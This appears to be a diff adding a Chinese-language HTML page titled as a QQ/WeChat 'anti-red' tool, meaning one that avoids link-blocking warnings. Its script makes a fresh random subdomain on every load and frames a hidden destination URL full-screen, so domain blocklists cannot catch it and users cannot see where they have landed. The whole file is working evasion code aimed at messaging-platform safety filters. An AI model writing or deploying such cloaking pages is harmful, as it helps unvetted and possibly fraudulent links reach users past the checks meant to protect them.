@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="webkit-tap-highlight-color" content="transparent">
+    <title>QQ微信防红30882343</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden; 
+            touch-action: manipulation; 
+        }
+        .no-border-iframe {
+            display: block; 
+            width: 100vw; 
+            height: 100vh; 
+            border: 0; 
+            outline: none; 
+        }
+    </style>
+</head>
+<body>
+    <!-- 先不设置src，通过JS动态赋值 -->
+    <iframe 
+        frameborder="0"
+        marginwidth="0" 
+        marginheight="0"
+        class="no-border-iframe"
+        title="示例页面"
+        scrolling="auto"> 
+    </iframe>
+
+    <script>
+        // 1. 生成8-12位随机字母数字字符串（和你PHP端逻辑一致）
+        function generateRandomStr(min = 8, max = 12) {
+            // 定义随机字符集：数字+大小写字母
+            const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            // 随机生成8-12位的长度
+            const length = Math.floor(Math.random() * (max - min + 1)) + min;
+            let randomStr = '';
+            const charsLength = chars.length;
+            
+            // 循环生成随机字符
+            for (let i = 0; i < length; i++) {
+                randomStr += chars.charAt(Math.floor(Math.random() * charsLength));
+            }
+            return randomStr;
+        }
+
+        // 2. 生成随机字符串并替换占位符，设置iframe的src
+        (function initIframeSrc() {
+            // 生成随机字符串
+            const suiji = generateRandomStr(8, 12);
+            // 拼接完整的src地址（替换{$suiji}占位符）
+            const targetUrl = `https://${suiji}.ai-pyp.cn?user_url=https://w.caoxo.top/`;
+            // 获取iframe元素并设置src
+            const iframe = document.querySelector('.no-border-iframe');
+            iframe.src = targetUrl;
+
+            // 可选：控制台打印生成的地址，方便调试
+            console.log('生成的iframe地址：', targetUrl);
+        })();
+    </script>
+</body>
+</html>
